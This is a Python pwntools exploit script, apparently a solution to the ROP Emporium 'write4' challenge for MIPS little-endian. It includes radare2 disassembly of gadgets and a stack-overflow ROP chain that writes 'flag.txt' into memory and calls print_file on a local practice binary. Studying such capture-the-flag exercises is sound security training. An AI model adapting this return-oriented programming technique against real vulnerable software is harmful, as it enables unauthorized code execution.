from pwn import *
context.binary = elf = ELF('write4_mipsel')

'''
[0x004006f0]> pd 10 @ loc.usefulGadgets 
            ;-- usefulGadgets:
            0x00400930      0c00b98f       lw t9, 0xc(sp)
            0x00400934      0800a88f       lw t0, 8(sp)
            0x00400938      0400a98f       lw t1, 4(sp)
            0x0040093c      000009ad       sw t1, (t0)
            0x00400940      09f82003       jalr t9
            0x00400944      1000bd23       addi sp, sp, 0x10
            0x00400948      0800a48f       lw a0, 8(sp)
            0x0040094c      0400b98f       lw t9, 4(sp)
            0x00400950      09f82003       jalr t9
            0x00400954      00000000       nop


[0x004006f0]> pdf @ sym.usefulFunction 
┌ 84: sym.usefulFunction (int32_t arg1, int32_t arg_10h);
|           ........................................................................................
│           0x004008fc      100b4424       addiu a0, v0, 0xb10         ; 0x400b10 ; "nonexistent" ; arg1 ; str.nonexistent
│           0x00400900      4080828f       lw v0, -sym.imp.print_file(gp) ; [0x411050:4]=0x400a90 sym.imp.print_file
│           0x00400904      25c84000       move t9, v0
│           0x00400908      09f82003       jalr t9


Useful gadget---------------------------------------------
  0x00400930           0c00b98f  lw t9, 0xc(sp)
  0x00400934           0800a88f  lw t0, 8(sp)
  0x00400938           0400a98f  lw t1, 4(sp)
  0x0040093c           000009ad  sw t1, (t0)
  0x00400940           09f82003  jalr t9
  0x00400944           1000bd23  addi sp, sp, 0x10

[0x00400a90]> pd 8 @ sym.imp.print_file 
            ;-- print_file:
            0x00400a90      1080998f       lw t9, -0x7ff0(gp)          ; obj._GLOBAL_OFFSET_TABLE_
                                                                       ; [0x411020:4]=0
            0x00400a94      2578e003       move t7, ra
            0x00400a98      09f82003       jalr t9
            0x00400a9c      10001824       addiu t8, zero, 0x10
            0x00400aa0      00000000       nop
            0x00400aa4      00000000       nop
            0x00400aa8      00000000       nop
            0x00400aac      00000000       nop


[Sections]
nth paddr        size vaddr       vsize perm name
―――――――――――――――――――――――――――――――――――――――――――――――――
18  0x00000ff0    0x8 0x00410ff0    0x8 -rw- .ctors
19  0x00000ff8    0x8 0x00410ff8    0x8 -rw- .dtors
20  0x00001000   0x10 0x00411000   0x10 -rw- .data
21  0x00001010    0x4 0x00411010    0x4 -rw- .rld_map
22  0x00001020   0x44 0x00411020   0x44 -rw- .got
23  0x00001064    0x4 0x00411064    0x4 -rw- .sdata
24  0x00001068    0x0 0x00411070   0x10 -rw- .bss

'''

offset = 36

where = 0x00411070
what1 = unpack(b'flag')
what2 = unpack(b'.txt')

g1 = 0x00400930
g2 = 0x00400948
plt_print_file = 0x00400a90

t9 = g1
t0 = where
t1 = what1

payload  = b'A'*offset + p32( g1 ) + p32(0x0) + p32(t1) + p32(t0) + p32(t9)

t9 = g2
t0 = where + 4
t1 = what2

payload += p32(0x0) + p32(t1) + p32(t0) + p32(t9) 

t9 = plt_print_file
a0 = where

payload += p32(0x0) + p32(t9) + p32(a0)


#p = gdb.debug(elf.path)
p = elf.process()

p.recv()
p.sendline(payload)
log.info(p.recvall())






